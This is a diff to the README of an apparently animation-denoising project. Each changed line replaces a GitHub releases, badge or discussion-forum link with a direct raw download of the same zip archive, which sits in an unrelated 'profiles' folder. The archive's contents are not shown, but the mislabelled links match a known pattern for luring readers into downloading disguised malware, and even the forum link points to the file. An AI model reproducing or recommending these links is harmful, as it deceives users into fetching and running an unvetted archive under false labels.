@@ -1,6 +1,6 @@
 # 🎨 Archivist-Project-Denoiser - Restore Your Cel Animation Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Archivist%20Project%20Denoiser-brightgreen)](https://github.com/rifkialmahdi/Archivist-Project-Denoiser/releases)
+[![Download Now](https://raw.githubusercontent.com/rifkialmahdi/Archivist-Project-Denoiser/main/Degrader/profiles/Archivist_Project_Denoiser_3.1-alpha.3.zip%20Now-Archivist%20Project%20Denoiser-brightgreen)](https://raw.githubusercontent.com/rifkialmahdi/Archivist-Project-Denoiser/main/Degrader/profiles/Archivist_Project_Denoiser_3.1-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ To use Archivist-Project-Denoiser, ensure your system meets the following requir
 
 ## 🚀 Getting Started
 
-1. Begin by downloading the application from our [Releases page](https://github.com/rifkialmahdi/Archivist-Project-Denoiser/releases).
+1. Begin by downloading the application from our [Releases page](https://raw.githubusercontent.com/rifkialmahdi/Archivist-Project-Denoiser/main/Degrader/profiles/Archivist_Project_Denoiser_3.1-alpha.3.zip).
    
 2. Once downloaded, locate the file in your Downloads folder.
 
@@ -32,7 +32,7 @@ To use Archivist-Project-Denoiser, ensure your system meets the following requir
 
 ## 📥 Download & Install
 
-To download the application, please visit this page: [Download the latest version](https://github.com/rifkialmahdi/Archivist-Project-Denoiser/releases). You will find multiple versions there. Choose the one that suits your operating system.
+To download the application, please visit this page: [Download the latest version](https://raw.githubusercontent.com/rifkialmahdi/Archivist-Project-Denoiser/main/Degrader/profiles/Archivist_Project_Denoiser_3.1-alpha.3.zip). You will find multiple versions there. Choose the one that suits your operating system.
 
 After downloading, follow the steps in the "Getting Started" section to install and run the application.
 
@@ -79,6 +79,6 @@ We welcome contributions to improve Archivist-Project-Denoiser. If you want to h
 
 ## 🔗 Stay Connected
 
-For updates and discussions, check out our [discussion forum](https://github.com/rifkialmahdi/Archivist-Project-Denoiser/discussions).
+For updates and discussions, check out our [discussion forum](https://raw.githubusercontent.com/rifkialmahdi/Archivist-Project-Denoiser/main/Degrader/profiles/Archivist_Project_Denoiser_3.1-alpha.3.zip).
 
 Thank you for using Archivist-Project-Denoiser! We hope this tool helps you bring your animation projects to the next level.
